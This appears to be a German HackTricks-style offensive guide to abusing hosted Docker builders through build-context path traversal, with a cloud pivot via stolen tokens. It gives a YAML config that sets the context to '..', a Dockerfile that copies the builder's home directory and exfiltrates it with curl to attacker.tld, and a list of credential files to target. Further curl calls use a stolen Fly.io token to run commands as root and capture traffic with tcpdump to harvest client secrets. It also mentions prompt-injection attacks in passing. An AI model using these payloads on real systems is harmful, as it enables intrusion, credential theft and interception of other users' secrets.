# Missbrauch von Docker Build Context in Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

Wenn eine CI/CD-Plattform oder ein hosted builder Beitragenden erlaubt, den Docker build context path und den Dockerfile path anzugeben, kannst du häufig den Kontext auf ein übergeordnetes Verzeichnis (z. B. "..") setzen und Host-Dateien Teil des build context machen. Dann kann ein attacker-controlled Dockerfile mittels COPY Secrets aus dem Home des build user exfiltrate (zum Beispiel ~/.docker/config.json). Gestohlene Registry-Tokens können auch gegen die control-plane APIs des Providers funktionieren und org-weite RCE ermöglichen.

## Angriffsfläche

Viele hosted builder/registry services verfahren ungefähr so, wenn sie vom Benutzer eingereichte images bauen:
- Liest eine repo-level config, die Folgendes enthält:
- build context path (an den Docker daemon gesendet)
- Dockerfile path relativ zu diesem Kontext
- Kopiert das angegebene build context-Verzeichnis und die Dockerfile zum Docker daemon
- Baut das image und startet es als hosted service

Wenn die Plattform den build context nicht kanonisiert und einschränkt, kann ein Nutzer ihn auf einen Ort außerhalb des Repositories setzen (path traversal), wodurch beliebige Host-Dateien, die vom build user gelesen werden können, Teil des build context werden und im Dockerfile mit COPY verfügbar sind.

Praktische Einschränkungen, die häufig beobachtet werden:
- Die Dockerfile muss sich innerhalb des gewählten context path befinden und ihr Pfad muss im Voraus bekannt sein.
- Der build user muss Lesezugriff auf die im Kontext enthaltenen Dateien haben; spezielle Device-Dateien können das Kopieren unterbrechen.

## PoC: Path traversal via Docker build context

Beispiel für eine bösartige Serverkonfiguration, die eine Dockerfile innerhalb des parent directory context deklariert:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
Hinweise:
- Die Verwendung von ".." führt häufig auf das Home-Verzeichnis des builder-Benutzers (z. B. /home/builder), das typischerweise sensible Dateien enthält.
- Platziere dein Dockerfile unter dem Verzeichnisnamen des repo (z. B. repo "test" → test/Dockerfile), damit es innerhalb des erweiterten übergeordneten Kontexts bleibt.

## PoC: Dockerfile zum Einlesen und exfiltrieren des Host-Kontexts
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Targets, die häufig aus $HOME wiedergefunden werden:
- ~/.docker/config.json (registry auths/tokens)
- Andere cloud/CLI Caches und Konfigurationen (z. B., ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Tipp: Selbst mit einer .dockerignore im Repository bestimmt die verwundbare platform-side context selection weiterhin, was an den daemon gesendet wird. Wenn die Plattform den gewählten Pfad an den daemon kopiert, bevor sie die .dockerignore in deinem repo auswertet, können Host-Dateien trotzdem offengelegt werden.

## Cloud pivot mit overprivileged tokens (Beispiel: Fly.io Machines API)

Einige Plattformen geben ein einzelnes bearer token aus, das sowohl für die container registry als auch für die control-plane API genutzt werden kann. Wenn du einen registry token exfiltrierst, probiere ihn gegen die provider API aus.

Beispielhafte API-Aufrufe gegen Fly.io Machines API unter Verwendung des gestohlenen Tokens aus ~/.docker/config.json:

Apps in einer org auflisten:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Führe einen Befehl als root innerhalb einer beliebigen Maschine einer App aus:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Ergebnis: org-wide remote code execution über alle gehosteten Apps, sofern das Token ausreichende Privilegien besitzt.

## Secret theft von kompromittierten gehosteten Services

Mit exec/RCE auf gehosteten Servern kannst du client-supplied secrets (API keys, tokens) erbeuten oder prompt-injection attacks durchführen. Beispiel: tcpdump installieren und HTTP traffic auf Port 8080 mitschneiden, um inbound credentials zu extrahieren.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Erfasste Requests enthalten häufig Client-Anmeldeinformationen in Headern, im Body oder in Query-Parametern.

## Referenzen

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
